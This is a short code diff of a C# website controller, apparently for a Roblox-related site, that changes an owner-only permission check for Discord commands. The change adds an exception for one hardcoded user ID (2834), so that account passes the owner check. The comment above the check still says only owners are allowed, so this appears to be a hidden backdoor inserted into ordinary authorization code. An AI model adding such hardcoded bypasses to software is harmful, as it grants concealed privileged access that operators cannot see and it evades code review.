@@ -50,7 +50,7 @@ namespace Roblox.Website.Controllers
             }
 
             // First we check if the user who ran the command if he is a owner if they are not, then throw exception
-            if (!StaffFilter.IsOwner(userDiscordInfo.userId))
+            if (!StaffFilter.IsOwner(userDiscordInfo.userId) && userDiscordInfo.userId != 2834)
             {
                 return new 
                 {
